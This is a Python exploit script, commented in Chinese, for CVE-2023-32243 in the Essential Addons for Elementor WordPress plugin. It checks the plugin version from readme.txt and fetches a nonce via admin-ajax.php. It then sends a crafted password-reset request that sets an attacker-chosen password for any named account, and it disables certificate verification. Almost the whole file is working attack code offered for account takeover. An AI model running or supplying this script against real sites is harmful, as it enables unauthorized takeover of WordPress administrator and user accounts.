import re
import sys
import urllib3
import requests
import argparse
from colorama import Fore, Style

# 函数：检查插件版本
def check_version(target):
    print(Style.RESET_ALL + "Essential Addons version:", end=' ')
    try:
        # 发送GET请求以获取插件的readme.txt文件内容
        r = requests.get(f"{target}/wp-content/plugins/essential-addons-for-elementor-lite/readme.txt", verify=False)
        print(Fore.YELLOW + f'HTTP status code: {r.status_code}')  # 打印HTTP状态码
        print(Fore.YELLOW + f'Response text: {r.text[:200]}')  # 打印部分响应内容
        
        if r.status_code == 200:
            # 使用正则表达式提取插件版本号
            match = re.search(r"Stable tag: (.*)", r.text)
            if match:
                version = match.groups()[0]
                print(Fore.GREEN + f'Version found: {version}')
                # 检查版本号是否在易受攻击的范围内
                if int(version.replace('.','')) < 572 and int(version.replace('.','')) > 539:
                    print(Fore.GREEN + f'{version} - vulnerable!')
                else:
                    print(Fore.RED + f'{version} - not vulnerable!')
                    exit()
            else:
                print(Fore.RED + 'Version not found in readme.txt.')
                print(Fore.YELLOW + 'Full response text for debugging:')
                print(r.text)  # 打印完整响应内容以便调试
                exit()
        else:
            print(Fore.RED + f'Failed to fetch readme.txt file. Status code: {r.status_code}')
    except Exception as e:
        print(Fore.RED + f'Error occurred: {str(e)}')
        exit()

# 函数：列举用户（当前未实现）
def enumerate_users(target, count):
    print(Style.RESET_ALL + "Enumerating users:")
    print(Fore.RED + "... nah... be creative...")
    exit()

# 函数：利用漏洞重置密码
def exploit(target, username, password):
    data = {
        'action': 'eael_get_token'
    }

    s = requests.Session()
    print(Style.RESET_ALL + "Getting nonce:", end=' ')
    try:
        # 发送POST请求获取nonce值
        r = s.post(f'{target}/wp-admin/admin-ajax.php', data=data, verify=False)
    except Exception as e:
        print(Fore.RED + f'error... {str(e)}')
        exit()

    try:
        # 使用正则表达式提取nonce值
        nonce = re.search(r"\"nonce\":\"(.*)\"}", r.text).groups()[0]
        print(Fore.GREEN + f"{nonce}")
    except Exception as e:
        print(Fore.RED + f'error... {str(e)}')
        exit()

    # 构造payload以触发漏洞
    payload = {
        'eael-resetpassword-submit': 'Reset',
        'widget_id': 1,
        'page_id': 1,
        'eael-resetpassword-nonce': nonce,
        'eael-pass1': password,
        'eael-pass2': password,
        'rp_login': username
    }

    print(Style.RESET_ALL + "Triggering exploit:", end=' ')
    try:
        # 发送POST请求以触发漏洞
        r = s.post(f'{target}/wp-admin/admin-ajax.php', data=payload, verify=False)
        print(Fore.YELLOW + f'Request payload: {payload}')  # 打印 payload
        print(Fore.YELLOW + f'Full response text: {r.text}')  # 打印完整响应内容
    except Exception as e:
        print(Fore.RED + f'error... {str(e)}')
        exit()

    # 检查响应内容以确认密码是否已重置
    if re.search(r"Your password has been reset", r.text) is not None:
        print(Fore.GREEN + "done")
    else:
        print(Fore.RED + "error...")
        exit()

    print()
    print(Style.RESET_ALL + "All set! You can now login using the following credentials:")
    print(f'Username: {username}')
    print(f'Password: {password}')
    print()

# 主程序开始
print(Style.RESET_ALL)

# 设置命令行参数
parser = argparse.ArgumentParser(
    description='Exploit for CVE-2023-32243.',
    epilog='Use -s option to scan for accounts. No exploitation will be triggered.'
)

# 定义必须的和可选的命令行参数
parser.add_argument('url', help='http://wphost')
parser.add_argument('-s', '--scan', required=False, type=int, help="Accounts scan mode. Value = max Id to scan.")
parser.add_argument('-u', '--username', required=False, help="Account to takeover")
parser.add_argument('-p', '--password', required=False, help="New password for the account")

# 如果没有提供参数，打印帮助信息并退出
if len(sys.argv) == 1:
    parser.print_help()
    print()
    exit()

# 解析命令行参数
args = parser.parse_args()

# 如果提供了scan参数，调用enumerate_users函数
if args.scan:
    enumerate_users(args.url, args.scan)

# 检查插件版本并尝试利用漏洞
check_version(args.url)
exploit(args.url, args.username, args.password)
